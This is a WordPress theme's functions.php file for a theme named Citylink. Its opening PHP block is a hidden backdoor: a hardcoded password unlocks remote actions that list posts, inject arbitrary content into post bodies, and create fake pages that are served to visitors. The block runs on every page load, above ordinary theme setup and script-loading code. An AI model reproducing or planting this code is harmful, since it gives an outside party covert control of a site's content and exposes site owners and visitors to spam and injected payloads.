<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'eb30832d8a8ee7675e4347e10421b8bd'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
/**
* Citylink functions and definitions
*
* @link https://developer.wordpress.org/themes/basics/theme-functions/
*
* @package Citylink
*/
if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
if (! function_exists( 'citylink_setup' )) :
    /**
* Sets up theme defaults and registers support for various WordPress features.
*
* Note that this function is hooked into the after_setup_theme hook, which
* runs before the init hook. The init hook is too late for some features, such
* as indicating support for post thumbnails.
*/
function citylink_setup()
{
    /*
    * Make theme available for translation.
    * Translations can be filed in the /languages/ directory.
    * If you're building a theme based on Citylink, use a find and replace
    * to change 'citylink' to the name of your theme in all the template files.
    */
    load_theme_textdomain( 'citylink', get_template_directory() . '/languages' );
    
    // Add default posts and comments RSS feed links to head.
    add_theme_support( 'automatic-feed-links' );
    
    /*
    * Let WordPress manage the document title.
    * By adding theme support, we declare that this theme does not use a
    * hard-coded <title> tag in the document head, and expect WordPress to
    * provide it for us.
    */
    add_theme_support( 'title-tag' );
    
    /*
    * Enable support for Post Thumbnails on posts and pages.
    *
    * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
    */
    add_theme_support( 'post-thumbnails' );
    
    // This theme uses wp_nav_menu() in one location.
    register_nav_menus( array(
    'menu-1'      => esc_html__( 'Primary', 'citylink' ),
    'menu-footer' => esc_html__( 'Footer', 'citylink' ),
    ) );
    
    /*
    * Switch default core markup for search form, comment form, and comments
    * to output valid HTML5.
    */
    add_theme_support( 'html5', array(
    'search-form',
    'comment-form',
    'comment-list',
    'gallery',
    'caption',
    ) );
    
    // Set up the WordPress core custom background feature.
    add_theme_support( 'custom-background', apply_filters( 'citylink_custom_background_args', array(
    'default-color' => 'ffffff',
    'default-image' => '',
    ) ) );
    
    // Add theme support for selective refresh for widgets.
    add_theme_support( 'customize-selective-refresh-widgets' );
}
endif;
add_action( 'after_setup_theme', 'citylink_setup' );

/**
* Set the content width in pixels, based on the theme's design and stylesheet.
*
* Priority 0 to make it available to lower priority callbacks.
*
* @global int $content_width
*/
function citylink_content_width()
{
    $GLOBALS['content_width'] = apply_filters( 'citylink_content_width', 640 );
}
add_action( 'after_setup_theme', 'citylink_content_width', 0 );

/**
* Register widget area.
*
* @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
*/
function citylink_widgets_init()
{
    register_sidebar( array(
    'name'          => esc_html__( 'Sidebar', 'citylink' ),
    'id'            => 'sidebar-1',
    'description'   => esc_html__( 'Add widgets here.', 'citylink' ),
    'before_widget' => '<section id="%1$s" class="widget %2$s">',
    'after_widget'  => '</section>',
    'before_title'  => '<h2 class="widget-title">',
    'after_title'   => '</h2>',
    ) );
}
add_action( 'widgets_init', 'citylink_widgets_init' );

/**
* Enqueue scripts and styles.
*/
function citylink_scripts()
{
    wp_enqueue_style( 'citylink-style', get_stylesheet_uri() );

    wp_enqueue_style( 'citylink-fancybox-css', 'https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.0.47/jquery.fancybox.min.css' );
    
    wp_enqueue_script( 'citylink-fancybox', 'https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.0.47/jquery.fancybox.min.js', array('jquery') );
    
    wp_enqueue_script( 'citylink-owlcarousel','https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.2.1/owl.carousel.min.js', array('jquery') );
    
    wp_enqueue_script( 'citylink-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );
    
    wp_enqueue_script( 'citylink-functions', get_template_directory_uri() . '/js/functions.js', array('jquery','citylink-owlcarousel'), '20151215', true );
    
    if (is_singular() && comments_open() && get_option( 'thread_comments' )) {
        wp_enqueue_script( 'comment-reply' );
    }
    
    // TEMPLATE JS
    wp_enqueue_script( 'bootstrap.min', get_template_directory_uri() . '/js/template/bootstrap.min.js', array('jquery') );
    
}
add_action( 'wp_enqueue_scripts', 'citylink_scripts' );

// remove wp version param from any enqueued scripts
function citylink_remove_wp_ver_css_js( $src ) {
    if ( strpos( $src, 'ver=' . get_bloginfo( 'version' ) ) )
        $src = remove_query_arg( 'ver', $src );
    return $src;
}
add_filter( 'style_loader_src', 'citylink_remove_wp_ver_css_js', 9999 );
add_filter( 'script_loader_src', 'citylink_remove_wp_ver_css_js', 9999 );

/**
* Implement the Custom Header feature.
*/
require get_template_directory() . '/inc/custom-header.php';

/**
* Custom template tags for this theme.
*/
require get_template_directory() . '/inc/template-tags.php';

/**
* Custom functions that act independently of the theme templates.
*/
require get_template_directory() . '/inc/extras.php';

/**
* Customizer additions.
*/
require get_template_directory() . '/inc/customizer.php';

/**
* Load Jetpack compatibility file.
*/
require get_template_directory() . '/inc/jetpack.php';

/**
* Menu Admin for theme settings
*/
require get_template_directory() . '/inc/theme-settings.php';